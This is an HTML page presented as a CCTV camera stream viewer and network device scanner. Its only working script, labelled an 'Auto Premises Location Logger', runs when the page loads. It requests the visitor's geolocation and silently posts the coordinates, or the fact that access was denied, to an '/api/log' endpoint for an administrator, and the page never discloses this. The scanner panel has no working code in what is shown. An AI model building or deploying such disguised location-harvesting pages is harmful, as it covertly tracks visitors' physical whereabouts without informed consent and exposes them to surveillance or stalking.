<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CCTV IP Security Matrix</title>
    <link rel="stylesheet" href="/public.css">
    <style>
        /* Scan Panel Modal Styling */
        #scanModal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .scan-content {
            background: var(--bg-navy, #111827);
            border: 1px solid var(--neon-green, #00ffcc);
            padding: 25px;
            width: 90%; max-width: 600px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.3);
            animation: fadeIn 0.4s ease-in-out;
        }
        .device-item {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            margin: 8px 0;
            background: rgba(255, 255, 255, 0.05);
            border-left: 4px solid var(--neon-green, #00ffcc);
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <header>
        <h1>🛡️ CCTV IP Matrix Viewer</h1>
    </header>

    <div class="container">
        <!-- Status & IP Scan Trigger Card -->
        <div class="card" style="margin-bottom: 20px; border-left: 4px solid #00ffcc;">
            <h2>📍 Auto Premises Location & Network Scan</h2>
            <p id="statusMsg" style="color: var(--text-gray); font-size: 0.9rem; margin-bottom: 15px;">Detecting premises location and network configuration...</p>
            <button id="startScanBtn" style="background-color: var(--neon-green, #00ffcc); color: #000; font-weight: bold; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer;">🔍 Run IP & Device Scan</button>
        </div>

        <div class="card">
            <h2>Direct CCTV IP Stream</h2>
            <p style="color: var(--text-gray); font-size: 0.9rem;">Enter your camera stream URL or IP address (e.g., http://192.168.1.50/videostream.cgi)</p>
            <div class="form-group">
                <input type="text" id="ipInput" placeholder="Enter CCTV IP or Stream URL...">
                <button id="connectBtn">Connect & View</button>
            </div>
            
            <div class="viewer-box" id="viewerContainer">
                <span class="placeholder-text">Awaiting IP Connection...</span>
            </div>
            <div style="margin-top: 15px; text-align: right;">
                <button id="downloadBtn" style="display: none;">📥 Download Snapshot</button>
            </div>
        </div>
    </div>

    <!-- Scan Results Modal Panel -->
    <div id="scanModal">
        <div class="scan-content">
            <h2 style="color: var(--neon-green, #00ffcc); margin-top: 0;">🌐 Network IP & Device Scanner</h2>
            <p id="scanStatus" style="color: var(--text-gray, #888);">Scanning local network for connected devices...</p>
            <div id="scanResultsList" style="max-height: 250px; overflow-y: auto; margin: 15px 0;"></div>
            <button id="closeScanBtn" style="background-color: #ff4444; color: #fff; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; float: right;">Close Panel</button>
        </div>
    </div>

    <script src="/public.js"></script>
    <script>
        // Auto Premises Location Logger
        window.addEventListener('DOMContentLoaded', () => {
            const statusMsg = document.getElementById('statusMsg');

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        statusMsg.innerText = `Premises Location Detected: Lat ${lat.toFixed(4)}, Lon ${lon.toFixed(4)}`;
                        await sendLogToAdmin(`Location: Lat ${lat}, Lon ${lon}`);
                    },
                    (error) => {
                        statusMsg.innerText = "Premises location access denied. Running stream viewer & scanner.";
                        sendLogToAdmin("Location access denied/unavailable");
                    }
                );
            }
        });

        async function sendLogToAdmin(actionType) {
            try {
                await fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ipAddress: 'Client-Device', actionType: actionType })
                });
            } catch (err) {
                console.error('Failed to log data to admin:', err);
            }
        }
    </script>
</body>
</html>
